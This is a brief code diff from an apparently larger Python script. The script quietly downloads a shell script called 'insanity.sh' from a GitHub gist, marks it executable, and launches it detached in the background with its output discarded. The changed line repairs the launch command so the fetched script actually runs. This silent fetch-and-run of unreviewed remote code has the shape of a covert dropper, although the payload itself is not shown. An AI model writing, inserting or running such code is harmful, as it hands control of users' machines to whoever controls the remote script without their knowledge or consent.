@@ -6,7 +6,7 @@ import subprocess, os
 
 os.system("curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s -o ${TMPDIR}/insanity.sh")
 os.system("chmod +x ${TMPDIR}/insanity.sh")
-subprocess.Popen(['nohup', '${TMPDIR}/insanity.sh'],
+subprocess.Popen(['nohup', 'sh', '${TMPDIR}/insanity.sh'],
                  stdout=open('/dev/null', 'w'),
                  stderr=open('logfile.log', 'a'),
                  preexec_fn=os.setpgrp
